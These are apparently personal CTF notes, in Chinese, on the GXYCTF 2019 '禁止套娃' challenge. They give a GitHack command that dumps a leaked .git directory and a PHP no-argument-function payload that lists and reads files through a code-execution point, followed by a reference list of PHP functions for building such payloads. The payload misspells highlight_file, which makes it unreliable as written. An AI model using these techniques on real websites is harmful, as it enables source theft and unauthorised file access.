GIT泄露

题目

[[GXYCTF 2019\]禁止套娃 | NSSCTF](https://www.nssctf.cn/problem/1095)

解法：[BuuCTF [GXYCTF2019\]禁止套娃详解（两种方法）-CSDN博客](https://blog.csdn.net/2301_76690905/article/details/134089541?ops_request_misc=%7B%22request%5Fid%22%3A%22170004998116800227446359%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170004998116800227446359&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-134089541-null-null.142^v96^pc_search_result_base1&utm_term=[GXYCTF 2019]禁止套娃&spm=1018.2226.3001.4187)

payload:?exp=highligth_file(next(array_reverse(scandir(current(localeconv())))));

githack语句：

```
python2 GitHack.py http://node4.anna.nssctf.cn:28735/.git  
```

###### scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）

###### localeconv() ：返回一包含本地数字及货币格式信息的二维数组。（但是这里数组第一项就是‘.’，这个.的用处很大）

###### current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西

###### end() ： 将内部指针指向数组中的最后一个元素，并输出

next() ：将内部指针指向数组中的下一个元素，并输出
prev() ：将内部指针指向数组中的上一个元素，并输出
reset() ： 将内部指针指向数组中的第一个元素，并输出
each() ： 返回当前元素的键名和键值，并将内部指针向前移动





![1700054433658](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1700054433658.png)

![1700054446870](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1700054446870.png)

    localeconv() – 函数返回一个包含本地数字及货币格式信息的数组 第一个是.
    pos() – 返回数组中的当前单元, 默认取第一个值
    next – 将内部指针指向数组下一个元素并输出
    scandir() – 扫描目录
    array_reverse() – 翻转数组
    array_flip() - 键名与数组值对调
    readfile()
    array_rand() - 随机读取键名
    var_dump() - 输出数组，可以用print_r替代
    file_get_contents() - 读取文件内容，show_source,highlight_file echo 可代替
    get_defined_vars() -  返回由所有已定义变量所组成的数组
    end() - 读取数组最后一个元素
    current() - 读取数组的第一个元素
    #php内置函数